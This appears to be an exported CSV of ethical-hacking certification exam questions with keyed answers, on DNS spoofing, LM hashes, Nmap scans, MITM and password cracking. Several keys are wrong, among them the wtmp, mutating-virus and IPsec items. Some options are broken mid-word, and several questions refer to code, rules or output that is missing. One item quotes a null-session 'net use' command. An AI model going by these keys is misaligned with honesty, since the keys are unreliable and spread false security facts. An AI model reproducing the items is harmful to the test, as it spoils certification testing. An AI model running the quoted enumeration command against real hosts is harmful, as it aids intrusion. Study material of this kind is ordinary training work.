"Let's imagine three companies (A, B and C), all competing in a challenging global environment. Company A and B are working together in developing a product that will generate a major competitive advantage for them. Company A has a secure DNS server while company B has a DNS server vulnerable to spoofing. With a spoofing attack on the DNS server of company B, company C gains access to outgoing e-mails from company B. How do you prevent DNS spoofing?\nA. Install DNS logger and track vulnerable packets\nB. Disable DNS timeouts\nC. Install DNS Anti-spoofing\nD. Disable DNS Zone Transfer\n","Answer: C — C. Install DNS Anti-spoofing"
"How can you determine if an LM hash you extracted contains a password that is less than 8 characters long?\nA. There is no way to tell because a hash cannot be reversed\nB. The right most portion of the hash is always the same\nC. The hash always starts with AB923D\nD. The left most portion of the hash is always the same\nE. A portion of the hash will be all 0's\n","Answer: B — B. The right most portion of the hash is always the same"
"You have successfully logged on a Linux system. You want to now cover your trade Your login attempt may be logged on several files located in /var/log. Which file does NOT belongs to the list:\nA. user.log\nB. auth.fesg\nC. wtmp\nD. btmp\n","Answer: C — C. wtmp"
"When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the administrator’s Computer to update the router configuration. What type of an alert is this?\nA. False negative\nB. True negative\nC. True positive\nD. False positive\n","Answer: D — D. False positive"
"If you want to only scan fewer ports than the default scan using Nmap tool, which option would you use?\nA. –r\nB. –F\nC. –P\nD. –sP\n","Answer: B — B. –F"
"ViruXine.W32 virus hides their presence by changing the underlying executable code. This Virus code mutates while keeping the original algorithm intact, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. Here is a section of the Virus code: What is this technique called?\nA. Polymorphic Virus\nB. Metamorphic Virus\nC. Dravidic Virus\nD. Stealth Virus\n","Answer: A — A. Polymorphic Virus"
"Study the snort rule given below: From the options below, choose the exploit against which this rule applies.\nA. WebDav\nB. SQL Slammer\nC. MS Blaster\nD. MyDoom\n","Answer: C — C. MS Blaster"
"“........is an attack type for a rogue Wi-Fi access point that appears to be a legitimate one offered on the premises, but actually has been set up to eavesdrop on wireless communications. It is the wireless version of the phishing scam. An attacker fools wireless users into connecting a laptop or mobile phone to a tainted hot- spot by posing as a legitimate provider. This type of attack may be used to steal the passwords of unsuspecting users by either snooping the communication link or by phishing, which involves setting up a fraudulent web site and luring people there.” Fill in the blank with appropriate choice.\nA. Evil Twin Attack\nB. Sinkhole Attack\nC. Collision Attack\nD. Signal Jamming Attack\n","Answer: A — A. Evil Twin Attack"
"You need a tool that can do network intrusion prevention and intrusion detection, function as a network sniffer, and record network activity, what tool would you most likely select?\nA. Nmap\nB. Cain & Abel\nC. Nessus\nD. Snort\n","Answer: D — D. Snort"
"While performing online banking using a Web browser, a user receives an email that contains a link to an interesting Web site. When the user clicks on the link, another Web browser session starts and displays a video of cats playing a piano. The next business day, the user receives what looks like an email from his bank, indicating that his bank account has been accessed from a foreign country. The email asks the user to call his bank and verify the authorization of a funds transfer that took place. What Web browser-based security vulnerability was exploited to compromise the user?\nA. Clickjacking\nB. Cross-Site Scripting\nC. Cross-Site Request Forgery\nD. Web form input validation\n","Answer: C — C. Cross-Site Request Forgery"
"User A is writing a sensitive email message to user B outside the local network. User A has chosen to use PKI to secure his message and ensure only user B can read the sensitive email. At what layer of the OSI layer does the encryption and decryption of the message take place?\nA. Application\nB. Transport\nC. Session\nD. Presentation\n","Answer: D — D. Presentation"
"A penetration tester is conducting a port scan on a specific host. The tester found several ports opened that were confusing in concluding the Operating System (OS) version installed. Considering that NMAP result below, which of the following is likely to be installed on the target machine by the OS? Starting NMAP 5.21 at 2011-03-15 11:06 NMAP scan report for 172.16.40.65 Host is up (1.00s latency). Not shown: 993 closed ports PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http 139/tcp open netbios-ssn 515/tcp open 631/tcp open ipp 9100/tcp open MAC Address: 00:00:48:0D:EE:8\nA. The host is likely a Linux machine.\nB. The host is likely a printer.\nC. The host is likely a router.\nD. The host is likely a Windows machine.\n","Answer: B — B. The host is likely a printer."
"Which type of sniffing technique is generally referred as MiTM attack?\nA. Password Sniffing\nB. ARP Poisoning\nC. Mac Flooding\nD. DHCP Sniffing\n","Answer: B — B. ARP Poisoning"
"Bob, a network administrator at BigUniversity, realized that some students are connecting their notebooks in the wired network to have Internet access. In the university campus, there are many Ethernet ports available for professors and authorized visitors but not for students. He identified this when the IDS alerted for malware activities in the network. What should Bob do to avoid this problem?\nA. Disable unused ports in the switches\nB. Separate students in a different VLAN\nC. Use the 802.1x protocol\nD. Ask students to use the wireless network\n","Answer: C — C. Use the 802.1x protocol"
"A zone file consists of which of the following Resource Records (RRs)?\nA. DNS, NS, AXFR, and MX records\nB. DNS, NS, PTR, and MX records\nC. SOA, NS, AXFR, and MX records\nD. SOA, NS, A, and MX records\n","Answer: D — D. SOA, NS, A, and MX records"
"Which system consists of a publicly available set of databases that contain domain name registration contact information?\nA. WHOIS\nB. CAPTCHA\nC. IANA\nD. IETF\n","Answer: A — A. WHOIS"
"During an Xmas scan what indicates a port is closed?\nA. No return response\nB. RST\nC. ACK\nD. SYN\n","Answer: B — B. RST"
"Every company needs a formal written document which spells out to employees precisely what they are allowed to use the company's systems for, what is prohibited, and what will happen to them if they break the rules. Two printed copies of the policy should be given to every employee as soon as possible after they join the organization. The employee should be asked to sign one copy, which should be safely filed by the company. No one should be allowed to use the company's computer systems until they have signed the policy in acceptance of its terms. What is this document called?\nA. Information Audit Policy (IAP)\nB. Information Security Policy (ISP)\nC. Penetration Testing Policy (PTP)\nD. Company Compliance Policy (CCP)\n","Answer: B — B. Information Security Policy (ISP)"
"Eve is spending her day scanning the library computers. She notices that Alice is using a computer whose port 445 is active and listening. Eve uses the ENUM tool to enumerate Alice machine. From the command prompt, she types the following command. What is Eve trying to do?\nA. Eve is trying to connect as a user with Administrator privileges\nB. Eve is trying to enumerate all users with Administrative privileges\nC. Eve is trying to carry out a password crack for user Administrator\nD. Eve is trying to escalate privilege of the null user to that of Administrator\n","Answer: C — C. Eve is trying to carry out a password crack for user Administrator"
"Bob is going to perform an active session hijack against Brownies Inc. He has found a target that allows session oriented connections (Telnet) and performs the sequence prediction on the target operating system. He manages to find an active session due to the high level of traffic on the network. What is Bob supposed to do next?\nA. Take over the session\nB. Reverse sequence prediction\nC. Guess the sequence numbers\nD. Take one of the parties offline\n","Answer: C — C. Guess the sequence numbers"
"The network team has well-established procedures to follow for creating new rules on the firewall. This includes having approval from a manager prior to implementing any new rules. While reviewing the firewall configuration, you notice a recently implemented rule but cannot locate manager approval for it. What would be a good step to have in the procedures for a situation like this?\nA. Have the network team document the reason why the rule was implemented without prior manager approval.\nB. Monitor all traffic using the firewall rule until a manager can approve it.\nC. Do not roll back the firewall rule as the business may be relying upon it, but try to get manager approval as soon as possible.\nD. Immediately roll back the firewall rule until a manager can approve it\n","Answer: D — D. Immediately roll back the firewall rule until a manager can approve it"
"Bob, a system administrator at TPNQM SA, concluded one day that a DMZ is not needed if he properly configures the firewall to allow access just to servers/ports, which can have direct internet access, and block the access to workstations. Bob also concluded that DMZ makes sense just when a stateful firewall is available, which is not the case of TPNQM SA. In this context, what can you say?\nA. Bob can be right since DMZ does not make sense when combined with stateless firewalls\nB. Bob is partially righ\nC. He does not need to separate networks if he can create rules by destination IPs, one by one\nD. Bob is totally wron\nE. DMZ is always relevant when the company has internet servers and workstations\nF. Bob is partially righ\nG. DMZ does not make sense when a stateless firewall is available\n","Answer: C — C. He does not need to separate networks if he can create rules by destination IPs, one by one"
"As a Certified Ethical Hacker, you were contracted by a private firm to conduct an external security assessment through penetration testing. What document describes the specifics of the testing, the associated violations, and essentially protects both the organization’s interest and your liabilities as a tester?\nA. Service Level Agreement\nB. Project Scope\nC. Rules of Engagement\nD. Non-Disclosure Agreement\n","Answer: C — C. Rules of Engagement"
"A technician is resolving an issue where a computer is unable to connect to the Internet using a wireless access point. The computer is able to transfer files locally to other machines, but cannot successfully reach the Internet. When the technician examines the IP address and default gateway they are both on the 192.168.1.0/24. Which of the following has occurred?\nA. The computer is not using a private IP address.\nB. The gateway is not routing to a public IP address.\nC. The gateway and the computer are not on the same network.\nD. The computer is using an invalid IP address.\n","Answer: B — B. The gateway is not routing to a public IP address."
"To determine if a software program properly handles a wide range of invalid input, a form of automated testing can be used to randomly generate invalid input in an attempt to crash the program. What term is commonly used when referring to this type of testing?\nA. Randomizing\nB. Bounding\nC. Mutating\nD. Fuzzing\n","Answer: D — D. Fuzzing"
"In the context of Windows Security, what is a 'null' user?\nA. A user that has no skills\nB. An account that has been suspended by the admin\nC. A pseudo account that has no username and password\nD. A pseudo account that was created for security administration purpose\n","Answer: C — C. A pseudo account that has no username and password"
"An attacker, using a rogue wireless AP, performed an MITM attack and injected an HTML code to embed a malicious applet in all HTTP connections. When users accessed any page, the applet ran and exploited many machines. Which one of the following tools the hacker probably used to inject HTML code?\nA. Wireshark\nB. Ettercap\nC. Aircrack-ng\nD. Tcpdump\n","Answer: B — B. Ettercap"
"Matthew, a black hat, has managed to open a meterpreter session to one of the kiosk machines in Evil Corp’s lobby. He checks his current SID, which is S-1-5-21-1223352397-1872883824-861252104-501. What needs to happen before Matthew has full administrator access?\nA. He must perform privilege escalation.\nB. He needs to disable antivirus protection.\nC. He needs to gain physical access.\nD. He already has admin privileges, as shown by the “501” at the end of the SID.\n","Answer: A — A. He must perform privilege escalation."
"Eric has discovered a fantastic package of tools named Dsniff on the Internet. He has learnt to use these tools in his lab and is now ready for real world exploitation. He was able to effectively intercept communications between the two entities and establish credentials with both sides of the connections. The two remote ends of the communication never notice that Eric is relaying the information between the two. What would you call this attack?\nA. Interceptor\nB. Man-in-the-middle\nC. ARP Proxy\nD. Poisoning Attack\n","Answer: B — B. Man-in-the-middle"
"CompanyXYZ has asked you to assess the security of their perimeter email gateway. From your office in New York, you craft a specially formatted email message and send it across the Internet to an employee of CompanyXYZ. The employee of CompanyXYZ is aware of your test. Your email message looks like this: From: [email] To: [email] Subject: Test message Date: 4/3/2017 14:37 The employee of CompanyXYZ receives your email message. This proves that CompanyXYZ’s email gateway doesn’t prevent what?\nA. Email Masquerading\nB. Email Harvesting\nC. Email Phishing\nD. Email Spoofing\n","Answer: D — D. Email Spoofing"
"This TCP flag instructs the sending system to transmit all buffered data immediately.\nA. SYN\nB. RST\nC. PSH\nD. URG\nE. FIN\n","Answer: C — C. PSH"
"Peter extracts the SIDs list from Windows 2000 Server machine using the hacking tool ""SIDExtractor"". Here is the output of the SIDs: From the above list identify the user account with System Administrator privileges.\nA. John\nB. Rebecca\nC. Sheela\nD. Shawn\nE. Somia\nF. Chang\nG. Micah\n","Answer: F — F. Chang"
"Although FTP traffic is not encrypted by default, which layer 3 protocol would allow for end-to-end encryption of the connection?\nA. SFTP\nB. Ipsec\nC. SSL\nD. FTPS\n","Answer: B — B. Ipsec"
"Switches maintain a CAM Table that maps individual MAC addresses on the network to physical ports on the switch. In MAC flooding attack, a switch is fed with many Ethernet frames, each containing different source MAC addresses, by the attacker. Switches have a limited memory for mapping various MAC addresses to physical ports. What happens when the CAM table becomes full?\nA. Switch then acts as hub by broadcasting packets to all machines on the network\nB. The CAM overflow table will cause the switch to crash causing Denial of Service\nC. The switch replaces outgoing frame switch factory default MAC address of FF:FF:FF:FF:FF:FF\nD. Every packet is dropped and the switch sends out SNMP alerts to the IDS port\n","Answer: A — A. Switch then acts as hub by broadcasting packets to all machines on the network"
"What is the known plaintext attack used against DES which gives the result that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key?\nA. Man-in-the-middle attack\nB. Meet-in-the-middle attack\nC. Replay attack\nD. Traffic analysis attack\n","Answer: B — B. Meet-in-the-middle attack"
"Some clients of TPNQM SA were redirected to a malicious site when they tried to access the TPNQM main site. Bob, a system administrator at TPNQM SA, found that they were victims of DNS Cache Poisoning. What should Bob recommend to deal with such a threat?\nA. The use of security agents in clients’ computers\nB. The use of DNSSEC\nC. The use of double-factor authentication\nD. Client awareness\n","Answer: B — B. The use of DNSSEC"
"Why would you consider sending an email to an address that you know does not exist within the company you are performing a Penetration Test for?\nA. To determine who is the holder of the root account\nB. To perform a DoS\nC. To create needless SPAM\nD. To illicit a response back that will reveal information about email servers and how they treat undeliverable mail\nE. To test for virus protection\n","Answer: D — D. To illicit a response back that will reveal information about email servers and how they treat undeliverable mail"
"You have the SOA presented below in your Zone. Your secondary servers have not been able to contact your primary server to synchronize information. How long will the secondary servers attempt to contact the primary server before it considers that zone is dead and stops responding to queries? collegae.edu.SOA, cikkye.edu ipad.college.edu. (200302028 3600 3600 604800 3600)\nA. One day\nB. One hour\nC. One week\nD. One month\n","Answer: C — C. One week"
"You have retrieved the raw hash values from a Windows 2000 Domain Controller. Using social engineering, you come to know that they are enforcing strong passwords. You understand that all users are required to use passwords that are at least 8 characters in length. All passwords must also use 3 of the 4 following categories: lower case letters, capital letters, numbers and special characters. With your existing knowledge of users, likely user account names and the possibility that they will choose the easiest passwords possible, what would be the fastest type of password cracking attack you can run against these hash values and still get results?\nA. Online Attack\nB. Dictionary Attack\nC. Brute Force Attack\nD. Hybrid Attack\n","Answer: D — D. Hybrid Attack"
"Take a look at the following attack on a Web Server using obstructed URL: How would you protect from these attacks?\nA. Configure the Web Server to deny requests involving ""hex encoded"" characters\nB. Create rules in IDS to alert on strange Unicode requests\nC. Use SSL authentication on Web Servers\nD. Enable Active Scripts Detection at the firewall and routers\n","Answer: B — B. Create rules in IDS to alert on strange Unicode requests"
"Which results will be returned with the following Google search query? site:target.com – site:Marketing.target.com accounting\nA. Results from matches on the site marketing.target.com that are in the domain target.com but do not include the word accounting.\nB. Results matching all words in the query.\nC. Results for matches on target.com and Marketing.target.com that include the word “accounting”\nD. Results matching “accounting” in domain target.com but not on the site Marketing.target.com\n","Answer: D — D. Results matching “accounting” in domain target.com but not on the site Marketing.target.com"
"Why should the security analyst disable/remove unnecessary ISAPI filters?\nA. To defend against social engineering attacks\nB. To defend against webserver attacks\nC. To defend against jailbreaking\nD. To defend against wireless attacks\n","Answer: B — B. To defend against webserver attacks"
"What is the way to decide how a packet will move from an untrusted outside host to a protected inside that is behind a firewall, which permits the hacker to determine which ports are open and if the packets can pass through the packet-filtering of the firewall?\nA. Session hijacking\nB. Firewalking\nC. Man-in-the middle attack\nD. Network sniffing\n","Answer: B — B. Firewalking"
"In the context of password security, a simple dictionary attack involves loading a dictionary file (a text file full of dictionary words) into a cracking application such as L0phtCrack or John the Ripper, and running it against user accounts located by the application. The larger the word and word fragment selection, the more effective the dictionary attack is. The brute force method is the most inclusive, although slow. It usually tries every possible letter and number combination in its automated exploration. If you would use both brute force and dictionary methods combined together to have variation of words, what would you call such an attack?\nA. Full Blown\nB. Thorough\nC. Hybrid\nD. BruteDics\n","Answer: C — C. Hybrid"
"Which of the following tools performs comprehensive tests against web servers, including dangerous files and CGIs?\nA. Nikto\nB. John the Ripper\nC. Dsniff\nD. Snort\n","Answer: A — A. Nikto"
"DHCP snooping is a great solution to prevent rogue DHCP servers on your network. Which security feature on switchers leverages the DHCP snooping database to help prevent man-in-the-middle attacks?\nA. Spanning tree\nB. Dynamic ARP Inspection (DAI)\nC. Port security\nD. Layer 2 Attack Prevention Protocol (LAPP)\n","Answer: B — B. Dynamic ARP Inspection (DAI)"
"Internet Protocol Security IPsec is actually a suite pf protocols. Each protocol within the suite provides different functionality. Collective IPsec does everything except.\nA. Protect the payload and the headers\nB. Encrypt\nC. Work at the Data Link Layer\nD. Authenticate\n","Answer: D — D. Authenticate"
"The following is an entry captured by a network IDS. You are assigned the task of analyzing this entry. You notice the value 0x90, which is the most common NOOP instruction for the Intel processor. You figure that the attacker is attempting a buffer overflow attack. You also notice ""/bin/sh"" in the ASCII part of the output. As an analyst what would you conclude about the attack?\nA. The buffer overflow attack has been neutralized by the IDS\nB. The attacker is creating a directory on the compromised machine\nC. The attacker is attempting a buffer overflow attack and has succeeded\nD. The attacker is attempting an exploit that launches a command-line shell\n","Answer: D — D. The attacker is attempting an exploit that launches a command-line shell"
"Steve, a scientist who works in a governmental security agency, developed a technological solution to identify people based on walking patterns and implemented this approach to a physical control access. A camera captures people walking and identifies the individuals using Steve’s approach. After that, people must approximate their RFID badges. Both the identifications are required to open the door. In this case, we can say:\nA. Although the approach has two phases, it actually implements just one authentication factor\nB. The solution implements the two authentication factors: physical object and physical characteristic\nC. The solution will have a high level of false positives\nD. Biological motion cannot be used to identify people\n","Answer: B — B. The solution implements the two authentication factors: physical object and physical characteristic"
"A regional bank hires your company to perform a security assessment on their network after a recent data breach. The attacker was able to steal financial data from the bank by compromising only a single server. Based on this information, what should be one of your key recommendations to the bank?\nA. Place a front-end web server in a demilitarized zone that only handles external web traffic\nB. Require all employees to change their anti-virus program with a new one\nC. Move the financial data to another server on the same IP subnet\nD. Issue new certificates to the web servers from the root certificate authority\n","Answer: A — A. Place a front-end web server in a demilitarized zone that only handles external web traffic"
"Which of the following is the best countermeasure to encrypting ransomwares?\nA. Use multiple antivirus softwares\nB. Pay a ransom\nC. Keep some generation of off-line backup\nD. Analyze the ransomware to get decryption key of encrypted data\n","Answer: C — C. Keep some generation of off-line backup"
"What does a firewall check to prevent particular ports and applications from getting packets into an organization?\nA. Transport layer port numbers and application layer headers\nB. Presentation layer headers and the session layer port numbers\nC. Network layer headers and the session layer port numbers\nD. Application layer port numbers and the transport layer headers\n","Answer: A — A. Transport layer port numbers and application layer headers"
"During the process of encryption and decryption, what keys are shared? During the process of encryption and decryption, what keys are shared?\nA. Private keys\nB. User passwords\nC. Public keys\nD. Public and private keys\n","Answer: C — C. Public keys"
"Which of the following is a command line packet analyzer similar to GUI-based Wireshark?\nA. nessus\nB. tcpdump\nC. ethereal\nD. jack the ripper\n","Answer: B — B. tcpdump"
"While using your bank’s online servicing you notice the following string in the URL bar: “http: // www. MyPersonalBank. com/ account?id=368940911028389&Damount=10980&Camount=21” You observe that if you modify the Damount & Camount values and submit the request, that data on the web page reflects the changes. Which type of vulnerability is present on this site?\nA. Cookie Tampering\nB. SQL Injection\nC. Web Parameter Tampering\nD. XSS Reflection\n","Answer: C — C. Web Parameter Tampering"
"Which method of password cracking takes the most time and effort?\nA. Dictionary attack\nB. Shoulder surfing\nC. Rainbow tables\nD. Brute force\n","Answer: D — D. Brute force"
"Which of the following LM hashes represent a password of less than 8 characters? (Choose two.)\nA. BA810DBA98995F1817306D272A9441BB\nB. 44EFCE164AB921CQAAD3B435B51404EE\nC. 0182BD0BD4444BF836077A718CCDF409\nD. CEC52EB9C8E3455DC2265B23734E0DAC\nE. B757BF5C0D87772FAAD3B435B51404EE\nF. E52CAC67419A9A224A3B108F3FA6CB6D\n","Answer: BE — B. 44EFCE164AB921CQAAD3B435B51404EE; E. B757BF5C0D87772FAAD3B435B51404EE"
"A user on your Windows 2000 network has discovered that he can use L0phtcrack to sniff the SMB exchanges which carry user logons. The user is plugged into a hub with 23 other systems. However, he is unable to capture any logons though he knows that other users are logging in. What do you think is the most likely reason behind this?\nA. There is a NIDS present on that segment.\nB. Kerberos is preventing it.\nC. Windows logons cannot be sniffed.\nD. L0phtcrack only sniffs logons to web servers.\n","Answer: B — B. Kerberos is preventing it."
"Yancey is a network security administrator for a large electric company. This company provides power for over 100, 000 people in Las Vegas. Yancey has worked for his company for over 15 years and has become very successful. One day, Yancey comes in to work and finds out that the company will be downsizing and he will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and backdoors all over the network to take down the company once he has left. Yancey does not care if his actions land him in jail for 30 or more years, he just wants the company to pay for what they are doing to him. What would Yancey be considered?\nA. Yancey would be considered a Suicide Hacker\nB. Since he does not care about going to jail, he would be considered a Black Hat\nC. Because Yancey works for the company currently; he would be a White Hat\nD. Yancey is a Hacktivist Hacker since he is standing up to a company that is downsizing\n","Answer: A — A. Yancey would be considered a Suicide Hacker"
"Which of the following steps for risk assessment methodology refers to vulnerability identification?\nA. Determines if any flaws exist in systems, policies, or procedures\nB. Assigns values to risk probabilities; Impact values.\nC. Determines risk probability that vulnerability will be exploited (Hig\nD. Medium, Low)\nE. Identifies sources of harm to an IT syste\nF. (Natural, Huma\nG. Environmental)\n","Answer: C — C. Determines risk probability that vulnerability will be exploited (Hig"
"The tools which receive event logs from servers, network equipment, and applications, and perform analysis and correlation on those logs, and can generate alarms for security relevant issues, are known as what?\nA. network Sniffer\nB. Vulnerability Scanner\nC. Intrusion prevention Server\nD. Security incident and event Monitoring\n","Answer: D — D. Security incident and event Monitoring"
"What is the following command used for? net use \targetipc$ """" /u:""""\nA. Grabbing the etc/passwd file\nB. Grabbing the SAM\nC. Connecting to a Linux computer through Samba.\nD. This command is used to connect as a null session\nE. Enumeration of Cisco routers\n","Answer: D — D. This command is used to connect as a null session"
"John the Ripper is a technical assessment tool used to test the weakness of which of the following?\nA. Passwords\nB. File permissions\nC. Firewall rulesets\nD. Usernames\n","Answer: A — A. Passwords"
"During a black-box pen test you attempt to pass IRC traffic over port 80/TCP from a compromised web enabled host. The traffic gets blocked; however, outbound HTTP traffic is unimpeded. What type of firewall is inspecting outbound traffic?\nA. Circuit\nB. Stateful\nC. Application\nD. Packet Filtering\n","Answer: B — B. Stateful"
"What term describes the amount of risk that remains after the vulnerabilities are classified and the countermeasures have been deployed?\nA. Residual risk\nB. Impact risk\nC. Deferred risk\nD. Inherent risk\n","Answer: A — A. Residual risk"
"Why is a penetration test considered to be more thorough than vulnerability scan?\nA. Vulnerability scans only do host discovery and port scanning by default.\nB. A penetration test actively exploits vulnerabilities in the targeted infrastructure, while a vulnerability scan does not typically involve active exploitation.\nC. It is not – a penetration test is often performed by an automated tool, while a vulnerability scan requires active engagement.\nD. The tools used by penetration testers tend to have much more comprehensive vulnerability databases.\n","Answer: B — B. A penetration test actively exploits vulnerabilities in the targeted infrastructure, while a vulnerability scan does not typically involve active exploitation."
